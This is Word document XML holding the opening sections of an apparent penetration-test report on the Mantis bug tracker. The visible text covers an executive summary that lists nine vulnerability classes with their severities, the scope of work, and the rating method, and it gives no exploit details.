        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="001B5937" w:rsidRPr="00802CE3" w:rsidRDefault="001B5937">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="000122C4" w:rsidP="001B5937">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1720"/>
        </w:tabs>
        <w:ind w:right="1420"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251650560" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>6361430</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>457200</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="13970" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="508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70" cy="179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4" w:name="page21"/>
      <w:bookmarkEnd w:id="4"/>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="229" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>1. Executive Summary</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="308" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRDefault="003978E5">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Optiv Application Security team was engaged to conduct security assessment</w:t>
      </w:r>
      <w:r w:rsidR="0029303A" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003F5DE5">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>on the Mantis bug tracking system</w:t>
      </w:r>
      <w:r w:rsidR="00F8662B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> application. The team identified 9</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> security defects that</w:t>
      </w:r>
      <w:r w:rsidR="00F8662B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> might impact confidentiality, integrity and availability of the application</w:t>
      </w:r>
      <w:r w:rsidR="0029303A" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00802CE3" w:rsidRPr="00802CE3" w:rsidRDefault="00802CE3">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A" w:rsidP="00A92E22">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>The findings from the assessment belong to the following categories (issue types) and have</w:t>
      </w:r>
      <w:r w:rsidR="00A92E22" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> been</w:t>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> categorized as Critical</w:t>
      </w:r>
      <w:r w:rsidR="00F8662B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>, High and Medium</w:t>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0004468C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>OS Command Injection</w:t>
      </w:r>
      <w:r w:rsidR="0029303A" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Critical</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0004468C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Code Injection</w:t>
      </w:r>
      <w:r w:rsidR="0029303A" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Critical</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0004468C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>SQL Injection</w:t>
      </w:r>
      <w:r w:rsidR="0029303A" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Critical</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="00FF5991" w:rsidP="00FF5991">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Cross Site Scripting</w:t>
      </w:r>
      <w:r w:rsidR="009A0937">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> - High</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="009A0937" w:rsidP="009A0937">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009A0937">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Backup/Default and Test Files found with Sensitive Information</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> - High</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="00F8662B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Insecure Direct Object Reference</w:t>
      </w:r>
      <w:r w:rsidR="00FF5991">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> - High</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="00FF5991" w:rsidP="00FF5991">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FF5991">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Directory Listing </w:t>
      </w:r>
      <w:r w:rsidR="00EC009A">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>- Medium</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRDefault="00EC009A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Information Disclosure </w:t>
      </w:r>
      <w:r w:rsidR="00F8662B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Medium</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F8662B" w:rsidRPr="00802CE3" w:rsidRDefault="00F8662B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Cross Site Request Forgery - Medium</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="4410"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2860"/>
        </w:tabs>
        <w:ind w:left="1800"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="00AB2226">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2860"/>
        </w:tabs>
        <w:ind w:left="1800"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="44E866D3" wp14:editId="594DFEEE">
            <wp:extent cx="4572000" cy="2743200"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>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2D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2860"/>
        </w:tabs>
        <w:ind w:left="1800"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2860"/>
        </w:tabs>
        <w:ind w:left="1800"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003E5300" w:rsidRPr="00802CE3" w:rsidRDefault="003E5300">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2860"/>
        </w:tabs>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003E5300" w:rsidRPr="00802CE3" w:rsidRDefault="003E5300">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2860"/>
        </w:tabs>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003E5300" w:rsidRPr="00802CE3" w:rsidRDefault="003E5300">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2860"/>
        </w:tabs>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2860"/>
        </w:tabs>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>2. Scope of Work</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="281" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRDefault="0029303A">
      <w:pPr>
        <w:spacing w:line="369" w:lineRule="auto"/>
        <w:ind w:left="720" w:right="1600"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>This security assessment covers the penetration testing of the</w:t>
      </w:r>
      <w:r w:rsidR="00EF28DB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003978E5">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Mantis bug tracking web application as well as SOAP based web services</w:t>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003978E5" w:rsidRDefault="003978E5">
      <w:pPr>
        <w:spacing w:line="369" w:lineRule="auto"/>
        <w:ind w:left="720" w:right="1600"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>The application security defect classes and areas examined during the assessment include:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003978E5" w:rsidRPr="00EC009A" w:rsidRDefault="003978E5" w:rsidP="00EC009A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:spacing w:line="369" w:lineRule="auto"/>
        <w:ind w:right="1600"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EC009A">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Access Control</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003978E5" w:rsidRPr="00EC009A" w:rsidRDefault="003978E5" w:rsidP="00EC009A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:spacing w:line="369" w:lineRule="auto"/>
        <w:ind w:right="1600"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EC009A">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Session Management</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003978E5" w:rsidRPr="00EC009A" w:rsidRDefault="003978E5" w:rsidP="00EC009A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:spacing w:line="369" w:lineRule="auto"/>
        <w:ind w:right="1600"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EC009A">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Injection Flaws</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003978E5" w:rsidRPr="00EC009A" w:rsidRDefault="003978E5" w:rsidP="00EC009A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:spacing w:line="369" w:lineRule="auto"/>
        <w:ind w:right="1600"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EC009A">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Error Handling and Information disclosure</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003978E5" w:rsidRPr="00EC009A" w:rsidRDefault="003978E5" w:rsidP="00EC009A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:spacing w:line="369" w:lineRule="auto"/>
        <w:ind w:right="1600"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EC009A">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Sensitive Data storage and encryption</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003978E5" w:rsidRPr="00EC009A" w:rsidRDefault="003978E5" w:rsidP="00EC009A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:spacing w:line="369" w:lineRule="auto"/>
        <w:ind w:right="1600"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EC009A">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Other common application vulnerabilities (OWASP Top 10, CWE/SANS Top 25) </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="153" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D43C03" w:rsidRPr="00802CE3" w:rsidRDefault="00D43C03">
      <w:pPr>
        <w:spacing w:line="153" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D43C03" w:rsidRPr="00802CE3" w:rsidRDefault="00D43C03">
      <w:pPr>
        <w:spacing w:line="153" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D43C03" w:rsidRPr="00802CE3" w:rsidRDefault="00D43C03">
      <w:pPr>
        <w:spacing w:line="153" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D43C03" w:rsidRPr="00802CE3" w:rsidRDefault="00D43C03">
      <w:pPr>
        <w:spacing w:line="153" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2860"/>
        </w:tabs>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>3.  Vulnerability Breakdown</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="184" w:lineRule="auto"/>
        <w:ind w:right="1500"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A" w:rsidP="003B1A2B">
      <w:pPr>
        <w:spacing w:line="184" w:lineRule="auto"/>
        <w:ind w:left="720" w:right="1500"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Vulnerabilities and findings are divided based on their impact</w:t>
      </w:r>
      <w:r w:rsidR="003B1A2B" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>(Potential Damage) and likelihood (Probability of identification and exploit). High Impact and High Likelihood vulnerabilities represent the highest priority and present the greatest threat.</w:t>
      </w:r>
      <w:r w:rsidR="003B1A2B" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Low Impact and Low Likelihood vulnerabilities represent the lowest priority and present the smallest threat.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="153" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0062005A" w:rsidRPr="00802CE3" w:rsidRDefault="0062005A">
      <w:pPr>
        <w:spacing w:line="153" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0062005A" w:rsidRPr="00802CE3" w:rsidRDefault="0062005A">
      <w:pPr>
        <w:spacing w:line="153" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
